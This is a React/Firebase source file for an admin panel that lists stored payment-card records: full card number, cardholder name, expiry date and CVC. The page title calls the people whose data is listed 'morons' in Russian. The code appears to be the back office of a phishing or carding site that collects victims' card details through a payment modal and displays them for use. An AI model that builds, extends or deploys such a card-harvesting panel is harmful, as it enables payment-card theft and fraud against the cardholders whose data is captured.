import React from "react";
import {useState , useEffect} from 'react';
import "./admin.css"
import Pagination from "../Pagination/Pagination";
import AddCardForm from "../AddCardForm/AddCardForm";
import {Link} from "react-router-dom";
import logo from "../../assets/Logo.png";
import {useDispatch} from "react-redux";
import {useAuth} from "../../hooks/use-auth";
import {signOut} from "firebase/auth";
import {auth, db} from "../../firebase";
import {removeUser} from "../../store/slices/userSlice";
import logo2 from "../../assets/Logo.png";
import BurgerMenu from "../BurgerMenu/BurgerMenu";
import { collection, addDoc, deleteDoc, query, where, onSnapshot, doc } from 'firebase/firestore';
import ModalPay from "../Modals/ModalPay/ModalPay";


const AdminPanel = () => {
    // const url = "http://localhost:3001/message";
    const [items, setItems] = useState([]);
    const [currentPage, setCurrentPage] = useState(1);
    const [itemsPerPage] = useState(3);
    const [showData, setShowData] = useState({});
    const [selectedData, setSelectedData] = useState(null);
    const [showButtons, setShowButtons] = useState(false);
    const lastItemsIndex = currentPage * itemsPerPage
    const firstItemsIndex = lastItemsIndex - itemsPerPage
    const currentItems = items.slice(firstItemsIndex, lastItemsIndex)
    const paginate = pageNumber => setCurrentPage(pageNumber)
    const dispatch = useDispatch();
    const {isAuth, token, photo, name, nickname, username, email} = useAuth();
    const [data, setData] = useState([]);
    const itemsCollection = collection(db, 'items');

    const logOut = () => {
        signOut(auth).then(() => {
            dispatch(removeUser())
        }).catch((error) => {

        });
    }

    let unsubscribe;

    useEffect(() => {

        const loadItems = async () => {
            const q = query(itemsCollection);
            unsubscribe = onSnapshot(q, (snapshot) => {
                const itemsData = [];
                snapshot.forEach((doc) => {
                    itemsData.push({ id: doc.id, ...doc.data() });
                });
                setItems(itemsData);
            });
        };
        loadItems();

        return () => unsubscribe();
    }, []);



    const handleAdd = async (newItem) => {
        try {
            const docRef = await addDoc(itemsCollection, newItem);
            const createdItem = { id: docRef.id, ...newItem };
            setItems((prevItems) => [...prevItems, createdItem]);
        } catch (error) {
            console.error(error);
        }
    };

    const handleRemove = async (id) => {
        try {
            await deleteDoc(doc(itemsCollection, id));
            setItems((prevItems) => prevItems.filter((item) => item.id !== id));
        } catch (error) {
            console.error(error);
        }
    };


    return (

        <div className="Maintable">
            <header className="headers">
                <BurgerMenu/>
                <div className="hero">
                    <div className="nav--main _container">
                        <Link to="/">
                            <div className="left--nav">
                                <img src={logo2} alt=""/>
                            </div>
                        </Link>
                        <div className="header__nav__menu menu">
                            <nav id="menu" className="menu__body">
                                <ul className="menu__list">
                                    {email === "admin@gmail.com" && (
                                        <Link to="/admin"><li>Admin Panel</li></Link>
                                    )}
                                    <li className="nomore">Features</li>
                                    <Link to="/prices"><li>Prices</li></Link>
                                    <li className="nomore">Company</li>
                                    <li className="nomore">Developers</li>
                                </ul>
                            </nav>
                        </div>
                        <div className="right--nav">
                            <div className="headers__text">
                                <p>Welcome {name} {nickname} {username}</p>
                                <p>Баланс: 0 ₽</p>
                            </div>
                            <Link to="/"><button className="right--nav-get-started" onClick={logOut}>Log out</button></Link>
                        </div>
                    </div>
                </div>
            </header>
            <div className="main _container">

                <div className="Table--block">
                    <div className="mainTable ">
                        <div className="mainTable--title">
                            Страница с ДОЛБАЁБАМИ №{currentPage}
                        </div>

                        <div className="mainTable--Body">
                            {currentItems.map((item) => (
                                <div id={item.id} className="card" key={item.id}>
                                    <div className="formClose" onClick={() => handleRemove(item.id)}>
                                        <label  htmlFor="X">X</label>
                                    </div>
                                    <p>ID: {item.id}</p>
                                    <p id="ItemInfo" className={item.id}>
                                        Сумма пополнения: {item.cardAmount}</p>
                                    <p id="ItemInfo" className={item.id}>
                                        Номер карты: {item.numberCard}
                                    </p>
                                    <p id="ItemInfo" className={item.id}>
                                        Имя и фамилия: {item.nameLastName}
                                    </p>
                                    <p>Срок действия: {item.cardValidity}/{item.cardValidity2}</p>
                                    <p>CVC: {item.cvv}</p>
                                    {/*<p>Имя: {item.name}</p>*/}
                                    {/*<p>Фамилия: {item.lastName}</p>*/}
                                    {/*<p>Город: {item.city}</p>*/}
                                    {/*<p>Расчетный адрес: {item.billingAddress}</p>*/}
                                    {/*<p>Почтовой индекс: {item.postcode}</p>*/}
                                    {/*<p>Страна: {item.country}</p>*/}
                                    {/*<p>Телефон: {item.phone}</p>*/}
                                </div>
                            ))}
                        </div>

                        <div className="mainTable--pagination">
                            <Pagination
                                itemsPerPage = {itemsPerPage}
                                totalItems = {items.length}
                                paginate = {paginate}
                            />
                        </div>
                    </div>
                </div>
            </div>
            <div id="addcard">
                <AddCardForm handleAdd={handleAdd}/>
                <ModalPay hangeleAdd = {handleAdd}/>
            </div>
        </div>
    );
}

export default AdminPanel;
